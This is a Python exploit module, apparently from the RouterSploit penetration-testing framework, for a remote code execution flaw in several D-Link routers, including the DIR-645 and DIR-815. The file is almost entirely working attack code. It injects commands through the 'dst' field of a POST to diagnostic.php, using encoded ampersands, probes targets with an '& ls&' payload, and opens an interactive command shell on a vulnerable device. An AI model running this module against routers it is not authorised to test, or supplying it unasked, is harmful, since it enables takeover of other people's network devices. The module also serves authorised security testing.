from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "D-Link DIR-645 & DIR-815 RCE",
        "description": "Module exploits D-Link DIR-645 and DIR-815 Remote Code Execution vulnerability which allows executing command on the device.",
        "authors": (
            "Michael Messner <devnull[at]s3cur1ty.de>",  # Vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "http://www.s3cur1ty.de/m1adv2013-017",
        ),
        "devices": (
            "DIR-815 v1.03b02",
            "DIR-645 v1.02",
            "DIR-645 v1.03",
            "DIR-600 below v2.16b01",
            "DIR-300 revB v2.13b01",
            "DIR-300 revB v2.14b01",
            "DIR-412 Ver 1.14WWB02",
            "DIR-456U Ver 1.00ONG",
            "DIR-110 Ver 1.01",
        )
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        if self.check():
            print_success("Target is vulnerable")
            print_status("Invoking command loop...")
            print_status("It is blind command injection, response is not available")
            shell(self, architecture="mipsle", method="echo", location="/var/tmp/")
        else:
            print_error("Exploit failed - target seems to be not vulnerable")

    def execute(self, cmd):
        cmd = "%26 {}%26".format(cmd.replace("&", "%26"))

        headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
        data = "act=ping&dst={}".format(cmd)

        self.http_request(
            method="POST",
            path="/diagnostic.php",
            headers=headers,
            data=data
        )
        return ""

    @mute
    def check(self):
        headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
        data = {"act": "ping",
                "dst": "& ls&"}

        response = self.http_request(
            method="POST",
            path="/diagnostic.php",
            headers=headers,
            data=data
        )
        if response is None:
            return False  # target is not vulnerable

        if response.status_code == 200 and "<report>OK</report>" in response.text:
            return True  # target is vulnerable

        return False  # target is not vulnerable
